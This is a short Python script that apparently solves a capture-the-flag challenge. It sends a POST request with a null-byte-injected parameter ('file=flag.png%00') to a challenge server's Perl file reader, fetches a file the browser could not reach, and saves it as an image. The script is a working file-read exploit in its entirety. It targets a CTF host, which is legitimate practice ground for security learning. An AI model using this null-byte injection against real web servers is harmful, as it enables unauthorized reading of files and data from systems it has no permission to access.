import requests
from PIL import Image
from StringIO import StringIO

HEADERS = {"Content-Type":"application/x-www-form-urlencoded"}
SERVER = "http://web.camsctf.com/7/read.pl"

# Playing around the url revealed that there was a flag.png file, but is unable to be
# accessed through the browser
request = requests.post(SERVER, data="file=flag.png%00", headers=HEADERS)

# Get and save image
img = Image.open(StringIO(request.content))
img.save("flag.png","PNG")
